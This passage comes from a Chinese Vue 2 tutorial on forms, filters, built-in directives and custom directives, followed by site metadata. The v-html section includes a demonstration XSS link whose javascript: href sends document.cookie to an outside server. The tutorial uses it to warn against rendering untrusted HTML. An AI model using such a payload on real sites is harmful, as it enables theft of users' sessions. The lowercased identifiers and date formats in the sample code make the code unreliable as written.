7个方法是push()、pop()、shift()、unshift()、splice()、sort()、reverse()；\n    2. 若不使用上面7个方法也想达到响应式处理效果，可以使用vue.set()或vm.$set()，例如vue.set(vm.persons, 1, { id: \'003\', name: \'周杰伦\', age: 27 })。\n 4. vue.set()和vm.$set()不能给vm或根数据对象（data）添加属性。\n\n----------------------------------------\n\n\n# 八、表单和过滤器\n\n\n# 8.1 收集表单数据\n\n我们在1.3 单向和双向数据绑定这一节了简单介绍过v-model，但实际使用还不是表面这么简单，有很多关于收集表单数据的技巧。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n    \x3c!-- form这里用不到action，一般使用ajax进行请求。submit表单的提交事件 --\x3e\n    <form @submit.prevent="submit">\n        \x3c!-- 点击标签也能让输入框获取焦点，可以使用for属性关联输入框 --\x3e\n        \x3c!--给v-model加上修饰符，去掉收尾的空格--\x3e\n        <label for="account">账号：</label>\n        <input type="text" id="account" v-model.trim="userinfo.account"><br><br>\n        <label for="password">密码：</label>\n        <input type="password" id="password" v-model="userinfo.password"><br><br>\n        \x3c!-- 加上number类型的限制，即使type是number，data里还是字符串，得使用v-model的修饰符 --\x3e\n        年龄：<input type="number" v-model.number="userinfo.age"><br><br>\n        \x3c!-- 一组单选框相当于单选题，各自的value="xxx"是单选题的选项，v-model="yyy"是单选题的答案 --\x3e\n        性别：\n        <input type="radio" v-model="userinfo.sex" value="male">男\n        <input type="radio" v-model="userinfo.sex" value="female">女<br><br>\n        \x3c!-- 一组复选框相当于多选题，各自的value="xxx"是多选题的选项，v-model="yyy"是多选题的答案 --\x3e\n        \x3c!-- 这个多选题的答案绑定yyy变量，最好是使用数组类型，除非这里只有一个input --\x3e\n        爱好：\n        <input type="checkbox" v-model="userinfo.hobby" value="study">学习\n        <input type="checkbox" v-model="userinfo.hobby" value="compute">上网\n        <input type="checkbox" v-model="userinfo.hobby" value="eat">吃饭<br><br>\n        所属地区：\n        <select v-model="userinfo.city">\n            <option value="beijing">北京</option>\n            <option value="shanghai">上海</option>\n            <option value="guangzhou">广州</option>\n            <option value="shenzhen">深圳</option>\n        </select><br><br>\n        \x3c!-- 给v-model加上修饰符，让它不要实时收集数据，只在失去焦点时才收集 --\x3e\n        其他信息：<textarea v-model.lazy="userinfo.other"></textarea><br><br>\n        \x3c!-- 单个的checkbox类input，直接去掉value="xxx"，v-model直接收集checked了（布尔值） --\x3e\n        <input type="checkbox" v-model="userinfo.agree"> 阅读并接受\n        <a href="www.baidu.com">《用户协议》</a><br><br>\n        <button>提交</button>\n    </form>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                userinfo: {\n                    account: \'\',\n                    password: \'\',\n                    age: \'\',\n                    sex: \'male\',\n                    hobby: [],\n                    city: \'\',\n                    other: \'\',\n                    agree: false\n                }\n            },\n            methods: {\n                submit() {\n                    console.log(\'userinfo\', this.userinfo);\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 常用的浏览器自带表单类组件<input type="xxx">、<select>、<textarea>等，v-model基本都是绑定的value属性，都可以用简写形式。\n 2. v-model在个别组件会表现得有些特殊。\n    1. <input type="radio">，多个“选项”（input）形成一道“单选题”，最后还要有“答案”。每个选项得先加上“标号”才能使用（单选题的a、b、c），那就给每个input设置值不相同的value属性（值常用常量字符串）。这个答案就是沟通内外的桥梁，那就给每个input设置v-model="xxx"，xxx就是答案（通常是data里的某个变量）。\n    2. <input type="checkbox">，它和上面的radio很像，同样要给每个input设置值不相同的value属性（多选题的a、b、c），同样要给每个input设置v-model="xxx"（多选题的答案）。开发人员要根据选项的数量（input数量）决定这个xxx是什么类型的变量，多个input就用数组类型（收集多个input的value），单个input就是用布尔类型（只有一个input，直接收集checked）。\n 3. v-model有三个修饰符：\n    1. .trim，去掉输入值首尾的空格；\n    2. .number，输入字符串转为有效的数值；\n    3. .lazy，失去焦点再收集数据。\n 4. 可以用<label>的for属性关联<input>的id属性，那么在点击标签时也能让输入框获得焦点。\n 5. <form>表单一般用不到action属性了，可以使用@submit绑定事件作为提交，并且还能加上事件修饰符（例如.prevent）。\n\n----------------------------------------\n\n\n# 8.2 过滤器\n\n我们经常遇到将时间戳转换后再到页面展示，转换的标准是固定的，我们可以引入第三方的类库来处理。引入后，这些格式化方法可以形成一个过滤器方法，能被多处调用。过滤器使用的是filters（它与computed平级），里面都是过滤器方法，在模板里使用的使用会与变量用|隔开。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    \x3c!--引入时间处理相关的第三方类库--\x3e\n    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>{{time|timeformater}}</h2>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                time: 1631345001107\n            },\n            // 过滤器\n            filters: {\n                // value值就是“|”前面那个变量的值（默认传参），将这个值进行格式化后return\n                timeformater(value) {\n                    return dayjs(value).format(\'yyyy-mm-dd hh:mm:ss\');\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n * 过滤器可以额外接收参数，过滤方法还是一样的，要适配好传参不传参的情况。\n * 可以组合使用多个过滤器方法，继续在原基础上追加|xxxformater，对应在filters里新增过滤器方法。\n * 写在vue实例的配置对象里filters的是局部过滤器，我们是可以定义全局过滤器，在vue实例化前使用vue.filter(\'xxx\',function(){})。定义全局过滤器的原因是，让多个组件使用（组件会在后面将）。\n * 过滤器是可以使用在v-bind指令里的，但是不能使用在v-model指令里。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    \x3c!--引入时间处理相关的第三方类库--\x3e\n    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>{{time|timeformater}}</h2>\n        \x3c!-- 过滤器额外接收参数，整体方法不变，对应要优化过滤器方法 --\x3e\n        <h2>{{time|timeformater(\'yyyy-mm-dd\')}}</h2>\n        \x3c!-- 追加使用新的过滤器方法 --\x3e\n        <h2>{{time|timeformater(\'yyyy-mm-dd\')|slicestr}}</h2>\n        \x3c!-- addstr是全局过滤器 --\x3e\n        <h2>{{time|timeformater(\'yyyy-mm-dd\')|slicestr|addstr}}</h2>\n        <h2 :x="msg|slicestr">在v-bind里使用slicestr过滤器，打开f12查看</h2>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 在vue实例化前定义一个全局过滤器\n        vue.filter(\'addstr\', function (value) {\n            return value + \'我是全局过滤器添加的小尾巴\';\n        });\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                time: 1631345001107,\n                msg: \'你在看什么？\'\n            },\n            // 过滤器\n            filters: {\n                // value是默认传参，这里对之前的代码进行了优化\n                timeformater(value, formatstr = \'yyyy-mm-dd hh:mm:ss\') {\n                    return dayjs(value).format(formatstr);\n                },\n                // 新过滤器方法\n                slicestr(value) {\n                    return value.slice(0, 4)\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 过滤器定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑处理）。\n 2. 过滤器语法：vue.filter(\'xxx\',function(value){})全局定义过滤器，new vue({filters:{xxx(value){}}})局部定义过滤器。\n 3. 过滤器的使用：{{xxx|yyyformater}} 或 v-bind="xxx|yyyformater"，但要记得不要在v-model里使用过滤器。\n 4. 过滤器可以额外接收参数，多个过滤器可以组合使用（串联）。\n\n----------------------------------------\n\n\n# 九、内置指令和自定义指令\n\n\n# 9.1 内置指令\n\n在1.3 单向和双向数据绑定里介绍了v-bind和v-model，在3.1 事件处理里介绍了v-on，在6.1 条件渲染里介绍了v-show和v-if，在6.2 列表渲染里介绍了v-for。这些都是内置指令，也就是vue提供的指令。这一节我们将剩下的内置指令简单介绍一下。\n\nv-text="xxx"会整体替换掉标签的标签体内容。与插值{{xxx}}的区别，插值可以插入到标签体内容而替换局部。还有值得注意的是，即使xxx里有标签也不会被解析，会直接被当做字符串来展示。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <div v-text="name"></div>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: { name: \'<h2>张三</h2>\', },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nv-html是可以支持标签解析的，这是与v-text的区别。v-html可能会涉及到安全问题，因为它在解析标签的时候可能会遇到js代码里获取敏感信息，将这些敏感信息泄露给不怀好意的服务器。下面这个例子，会将<a>解析出来，这个<a>有恶意js脚本，点击<a>会读取浏览器的cookie信息，并将这个cookie信息传递给了跳转的服务器地址。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <div v-html="msg"></div>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 其实cookie中有个httponly字段，可以只让http协议相关的才能读取cookie信息，避免js代码读取\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                msg: `<a href=javascript:location.href=\'http://www.baidu.com?\'+document.cookie>这里有你想要的资源，限时免费哟！</a>`,\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nv-cloak指令经常搭配css使用。在vue还没有接管容器时，模板中使用v-cloak就会出现这个同名属性，在vue接管容器后，模板中的v-cloak属性就会消失。如果搭配css使用，在v-cloak属性出现时，让所有用于该属性的元素进行display:none隐藏，在v-cloak属性消失后该css样式失效。这样做的目的，是为了让用户不要见到类似{{xxx}}等，提高用户的感观。\n\n我们将以前的代码结构稍加调整，将<script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>移到了容器下方，并将浏览器的下载速率限制到100k/s，这样的话vue.js会下载很慢，那就会让类似{{xxx}}先显示在页面上，但这样对用户感观不好。所以又使用了v-cloak配合css样式优化了这一点（你可以去掉v-cloak看会出现什么问题），代码如下，记得页面刷新的时候，使用“清除缓存并硬性重新加载”。\n\n\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <style>\n        [v-cloak] {\n            display: none;\n        }\n    </style>\n</head>\n<body>\n    <div id="root">\n        <div v-cloak>{{name}}</div>\n    </div>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</body>\n<script type="text/javascript">\n    vue.config.productiontip = false;\n    const vm = new vue({\n        el: \'#root\',\n        data: {\n            name: \'张三\'\n        },\n    });\n<\/script>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nv-once指令让元素初次渲染后就不再动态变化了，会被视为静态内容。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 v-once>初始化值：{{num}}</h2>\n        <h2>当前的值：{{num}}</h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: { num: 5 },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nv-pre指令是告知vue不要解析它所在的元素了，直接展示在页面。比较适用于没有模板语法的元素。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 v-pre>这里是静态文本，没有使用模板语法</h2>\n        <h2>当前的值：{{num}}</h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: { num: 5 },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. v-text向其所在节点中渲染文本内容。它是整体替换标签体内容，而插值能只代替一部分。\n 2. v-html向指定中渲染包含html结构的内容。与v-text类似，它也会整体替换标签体内容，但是它会解析内容里的标签。\n 3. v-html有安全性问题，在网站上动态渲染html是非常危险的，容易导致xss攻击，一定要在可信内容上使用v-html，不要在用户提交的内容里使用。\n 4. v-cloak指令是没有值的，本质是一个特殊属性。vue实例创建完毕并接管容器后，会删除v-cloak属性。搭配css使用，可以解决网速慢时页面展示出{{xxx}}的问题。\n 5. v-once指令所在节点在初次动态渲染后，就被视为静态内容了。以后数据变化不会引起v-once所在节点的更新，可以用于性能优化。\n 6. v-pre是跳过其所在节点的解析过程。可用它跳过没有使用模板语法的节点，加快组件的解析过程。\n\n----------------------------------------\n\n\n# 9.2 自定义指令\n\n自定义指令是对原生dom操作进行了封装，将这些操作封装成了一个自定义指令。自定义指令是定义在directives里，directives与methods平级，自定义指令时，不用自己加上v-，但在模板里使用还是v-xxx。\n\n自定义指令有函数和对象两种定义形式。我们先看函数的形式，它接收两个参数：element和binding。其中element是自定义指令使用时，它所在的真实dom元素，binding是自定义指令的绑定目标，例如v-xxx=\'yyy\'中的yyy。\n\nbinding里的expression属性是绑定目标，它是js表达式；binding里的name属性就是自定义指令的名字；binding里的rawname属性就是自定义指令在使用时的名字；binding里的value属性就是绑定目标最终的值（js表达式的值）。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>放大10倍后的值：<span v-big="num"></span></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                num: 5\n            },\n            // 自定义指令存放处\n            directives: {\n                // element是自定义指令使用处所在的真实元素，binding是绑定的动态变量\n                big(element, binding) {\n                    // 将原来的num放大10倍\n                    element.innertext = binding.value * 10;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面例子的big函数会在何时被调用？\n\n * 在自定义指令与元素成功绑定时；\n * 自定义指令所在模板被重新解析时。\n\n这两点都有各自的注意点，首先看第二点，自定义指令并不是在它所依赖数据变化时被调用，而是在模板被重新解析时被调用，这是vue扩大了范围更加准确无误地让自定义指令运行。\n再看第一点，与“元素”成功绑定，这个“元素”是虚拟元素，此时对应的真实元素还没有生成也还没有添加到页面上进行展示。\n\n因为big函数的第一点调用时机会导致一些代码无法生效，比如让元素在初始化时获得焦点。你看下面这个例子，element.focus()运行了但没有生效，原因就是focus()必须在真实元素添加到dom结构后才能获得焦点，这就与第一点调用时机对应不上了，所以focus()也就不生效了。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>新的input：<input v-fbind:value="num"></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: { num: 5 },\n            directives: {\n                fbind(element, binding) {\n                    element.value = binding.value;\n                    element.focus();\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n要解决上面的问题，就得使用对象形式的自定义指令。该对象有三个属性bind、inserted和update，三个属性的值是方法，在运行到特定时机会调用对应的这三个方法中的其中一个。\n\n * bind是在自定义指令与虚拟元素成功绑定时被调用；\n * inserted是自定义指令所在真实元素被插入到页面时被调用；\n * update是自定义指令在模板被重新解析时被调用。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>新的input：<input v-fbind:value="num"></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: { num: 5 },\n            directives: {\n                fbind: {\n                    // 自定义指令与虚拟元素成功绑定时bind被调用\n                    bind(element, binding) {\n                        element.value = binding.value;\n                    },\n                    // 自定义指令所在真实元素被插入到页面时inserted被调用\n                    inserted(element, binding) {\n                        element.focus();\n                    },\n                    // 自定义指令在模板被重新解析时update被调用\n                    update(element, binding) {\n                        // 这行别忘写了，模板更新时这个数据也得更新\n                        element.value = binding.value;\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n自定义指令的其他注意点：\n\n * 自定义指令的命名，如果是多个单词，就使用-短横线进行分隔，在directives方法对应就写字符串形式。\n * 自定义指令相关的回调函数，也就是bind、inserted和update这三个方法，它们的this不是vm，而是window本身。原因就是它们的入参element和binding就足够使用了，无需用到vue实例。\n * 我们可以定义全局自定义指令，使用的是vue.directive(\'xxx\', {bind(){},inserted(){},update(){}})。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>放大5倍后的值：<span v-big="num"></span></h2>\n        \x3c!-- 自定义指令是多个单词组成，使用短横线-分隔 --\x3e\n        <h2>放大10倍后的值：<span v-big-number="num"></span></h2>\n        <h2>新的input：<input v-fbind:value="num"></input></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 全局自定义属性\n        vue.directive(\'big\', function (element, binding) {\n            element.innertext = binding.value * 5;\n        })\n        const vm = new vue({\n            el: \'#root\',\n            data: { num: 5 },\n            directives: {\n                // 自定义指令是多个单词组成，定义处使用字符串形式\n                \'big-number\': function (element, binding) {\n                    // 自定义指令的this是指向window的\n                    console.log(\'this\', this);\n                    element.innertext = binding.value * 10;\n                },\n                fbind: {\n                    // 自定义指令与虚拟元素成功绑定时bind被调用\n                    bind(element, binding) {\n                        element.value = binding.value;\n                    },\n                    // 自定义指令所在真实元素被插入到页面时inserted被调用\n                    inserted(element, binding) {\n                        element.focus();\n                    },\n                    // 自定义指令在模板被重新解析时update被调用\n                    update(element, binding) {\n                        element.value = binding.value;\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 自定义指令语法：\n    1. 局部指令：new vue({directives: xxx(){}})或new vue({directives: {xxx:{bind(){},inserted(){},update(){}}}})\n    2. 全局指令：vue.directive(\'xxx\', function(element, binding){})或vue.directive(\'xxx\', {bind(){},inserted(){},update(){}})\n 2. 自定义指令的配置对象里常用的3个回调：\n    1. bind，自定义指令与虚拟元素成功绑定时bind被调用\n    2. inserted，自定义指令所在真实元素被插入到页面时inserted被调用\n    3. update，自定义指令在模板被重新解析时update被调用\n 3. 备注：\n    1. 自定义指令在定义时不要加v-，但要在使用时加上v-；\n    2. 自定义指令如果是多个单词组成的，要使用短横线-进行分隔，对应方法名使用字符串形式。\n\n----------------------------------------',charsets:{cjk:!0}},{title:"2.Vue进阶",frontmatter:{title:"2.Vue进阶"},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/2.vue%E8%BF%9B%E9%98%B6.html",relativePath:"book-web/web前端js框架/学习Vue/2.vue进阶.md",key:"v-56a2b714",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/2.vue%E8%BF%9B%E9%98%B6.html",headers:[{level:2,title:"一、Vue实例生命周期",slug:"一、vue实例生命周期",normalizedTitle:"一、vue实例生命周期",charIndex:12},{level:3,title:"1.1 这个定时器要放哪",slug:"_1-1-这个定时器要放哪",normalizedTitle:"1.1 这个定时器要放哪",charIndex:28},{level:3,title:"1.2 挂载流程",slug:"_1-2-挂载流程",normalizedTitle:"1.2 挂载流程",charIndex:3331},{level:3,title:"1.3 更新流程",slug:"_1-3-更新流程",normalizedTitle:"1.3 更新流程",charIndex:6446},{level:3,title:"1.4 销毁流程",slug:"_1-4-销毁流程",normalizedTitle:"1.4 销毁流程",charIndex:7947},{level:3,title:"1.5 整个生命周期图示",slug:"_1-5-整个生命周期图示",normalizedTitle:"1.5 整个生命周期图示",charIndex:9704},{level:2,title:"二、Vue组件化编程",slug:"二、vue组件化编程",normalizedTitle:"二、vue组件化编程",charIndex:10238},{level:3,title:"2.1 什么是组件化编程",slug:"_2-1-什么是组件化编程",normalizedTitle:"2.1 什么是组件化编程",charIndex:10253},{level:3,title:"2.2 如何运用组件",slug:"_2-2-如何运用组件",normalizedTitle:"2.2 如何运用组件",charIndex:10649},{level:3,title:"2.3 组件的几个注意点",slug:"_2-3-组件的几个注意点",normalizedTitle:"2.3 组件的几个注意点",charIndex:17017},{level:3,title:"2.4 组件的嵌套",slug:"_2-4-组件的嵌套",normalizedTitle:"2.4 组件的嵌套",charIndex:21392},{level:3,title:"2.5 VueComponent",slug:"_2-5-vuecomponent",normalizedTitle:"2.5 vuecomponent",charIndex:22993},{level:3,title:"2.6 单文件组件",slug:"_2-6-单文件组件",normalizedTitle:"2.6 单文件组件",charIndex:27047},{level:2,title:"三、组件相关零碎知识",slug:"三、组件相关零碎知识",normalizedTitle:"三、组件相关零碎知识",charIndex:29671},{level:3,title:"3.1 解析成虚拟DOM的方式",slug:"_3-1-解析成虚拟dom的方式",normalizedTitle:"3.1 解析成虚拟dom的方式",charIndex:29686},{level:3,title:"3.2 render函数",slug:"_3-2-render函数",normalizedTitle:"3.2 render函数",charIndex:30275},{level:3,title:"3.3 ref特殊属性",slug:"_3-3-ref特殊属性",normalizedTitle:"3.3 ref特殊属性",charIndex:31524},{level:3,title:"3.4 props数据流向",slug:"_3-4-props数据流向",normalizedTitle:"3.4 props数据流向",charIndex:32628},{level:3,title:"3.5 mixin混入",slug:"_3-5-mixin混入",normalizedTitle:"3.5 mixin混入",charIndex:36990},{level:3,title:"3.6 插件",slug:"_3-6-插件",normalizedTitle:"3.6 插件",charIndex:39265},{level:3,title:"3.7 scoped样式",slug:"_3-7-scoped样式",normalizedTitle:"3.7 scoped样式",charIndex:41959},{level:2,title:"四、TodoList案例",slug:"四、todolist案例",normalizedTitle:"四、todolist案例",charIndex:43121},{level:3,title:"4.1 将页面拆分成组件",slug:"_4-1-将页面拆分成组件",normalizedTitle:"4.1 将页面拆分成组件",charIndex:43138},{level:3,title:"4.2 初始化操作-列表渲染",slug:"_4-2-初始化操作-列表渲染",normalizedTitle:"4.2 初始化操作-列表渲染",charIndex:47660},{level:3,title:"4.3 添加操作-状态提升",slug:"_4-3-添加操作-状态提升",normalizedTitle:"4.3 添加操作-状态提升",charIndex:48848},{level:3,title:"4.4 勾选和删除",slug:"_4-4-勾选和删除",normalizedTitle:"4.4 勾选和删除",charIndex:51796},{level:3,title:"4.5 底部统计",slug:"_4-5-底部统计",normalizedTitle:"4.5 底部统计",charIndex:55118},{level:3,title:"4.6 TodoList本地缓存",slug:"_4-6-todolist本地缓存",normalizedTitle:"4.6 todolist本地缓存",charIndex:60023},{level:2,title:"五、自定义事件和全局事件总线",slug:"五、自定义事件和全局事件总线",normalizedTitle:"五、自定义事件和全局事件总线",charIndex:63695},{level:3,title:"5.1 绑定自定义事件",slug:"_5-1-绑定自定义事件",normalizedTitle:"5.1 绑定自定义事件",charIndex:63714},{level:3,title:"5.2 解绑自定义事件",slug:"_5-2-解绑自定义事件",normalizedTitle:"5.2 解绑自定义事件",charIndex:67559},{level:3,title:"5.3 自定义事件注意点",slug:"_5-3-自定义事件注意点",normalizedTitle:"5.3 自定义事件注意点",charIndex:69237},{level:3,title:"5.4 TodoList使用自定义事件",slug:"_5-4-todolist使用自定义事件",normalizedTitle:"5.4 todolist使用自定义事件",charIndex:71106},{level:3,title:"5.5 全局事件总线",slug:"_5-5-全局事件总线",normalizedTitle:"5.5 全局事件总线",charIndex:75014},{level:3,title:"5.6 TodoList使用全局事件总线",slug:"_5-6-todolist使用全局事件总线",normalizedTitle:"5.6 todolist使用全局事件总线",charIndex:79121},{level:3,title:"5.7 给TodoList追加编辑功能",slug:"_5-7-给todolist追加编辑功能",normalizedTitle:"5.7 给todolist追加编辑功能",charIndex:82386},{level:2,title:"六、Vue中的动画与过渡",slug:"六、vue中的动画与过渡",normalizedTitle:"六、vue中的动画与过渡",charIndex:86731},{level:3,title:"6.1 动画",slug:"_6-1-动画",normalizedTitle:"6.1 动画",charIndex:86748},{level:3,title:"6.2 过渡",slug:"_6-2-过渡",normalizedTitle:"6.2 过渡",charIndex:90007},{level:3,title:"6.3 多元素动画/过渡",slug:"_6-3-多元素动画-过渡",normalizedTitle:"6.3 多元素动画/过渡",charIndex:91183},{level:3,title:"6.4 集成第三方动画库",slug:"_6-4-集成第三方动画库",normalizedTitle:"6.4 集成第三方动画库",charIndex:91908},{level:2,title:"七、内容分发——插槽",slug:"七、内容分发-插槽",normalizedTitle:"七、内容分发——插槽",charIndex:94135},{level:3,title:"7.1 默认插槽",slug:"_7-1-默认插槽",normalizedTitle:"7.1 默认插槽",charIndex:94150},{level:3,title:"7.2 具名插槽",slug:"_7-2-具名插槽",normalizedTitle:"7.2 具名插槽",charIndex:98659},{level:3,title:"7.3 作用域插槽",slug:"_7-3-作用域插槽",normalizedTitle:"7.3 作用域插槽",charIndex:102232}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、Vue实例生命周期 1.1 这个定时器要放哪 1.2 挂载流程 1.3 更新流程 1.4 销毁流程 1.5 整个生命周期图示 二、Vue组件化编程 2.1 什么是组件化编程 2.2 如何运用组件 2.3 组件的几个注意点 2.4 组件的嵌套 2.5 VueComponent 2.6 单文件组件 三、组件相关零碎知识 3.1 解析成虚拟DOM的方式 3.2 render函数 3.3 ref特殊属性 3.4 props数据流向 3.5 mixin混入 3.6 插件 3.7 scoped样式 四、TodoList案例 4.1 将页面拆分成组件 4.2 初始化操作-列表渲染 4.3 添加操作-状态提升 4.4 勾选和删除 4.5 底部统计 4.6 TodoList本地缓存 五、自定义事件和全局事件总线 5.1 绑定自定义事件 5.2 解绑自定义事件 